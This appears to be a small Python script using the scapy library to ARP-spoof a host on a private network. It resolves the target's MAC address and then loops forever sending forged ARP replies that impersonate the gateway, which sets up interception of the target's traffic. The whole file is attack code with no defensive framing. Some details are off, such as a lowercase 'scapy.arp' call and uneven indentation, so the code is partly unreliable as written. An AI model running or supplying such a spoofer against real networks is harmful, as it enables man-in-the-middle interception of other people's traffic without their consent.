import scapy.all as scapy

def spoof(target_ip, target_mac, spoof_ip):
 spoofed_arp_packet = scapy.arp(pdst=target_ip,hwdst=target_mac, psrc=spoof_ip, op="is-at")
 scapy.send(spoofed_arp_packet, verbose = 0)

def get_mac(ip):
    arp_request = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst = ip)
    reply, something= scapy.srp(arp_request,timeout = 3, verbose = 0)
    if reply:
       return reply [0][1].src
    return None




gateway_ip = "192.168.10.1"
target_ip = "192.168.10.146"

target_mac = None
while not target_mac:
   target_mac = get_mac(target_ip)
   if not target_mac:
      print("mac addres for target not found \n")
print("target mac addres is:{}".format(target_mac))

while True:
   spoof(target_ip, target_mac, gateway_ip)
   print("spoofing is active")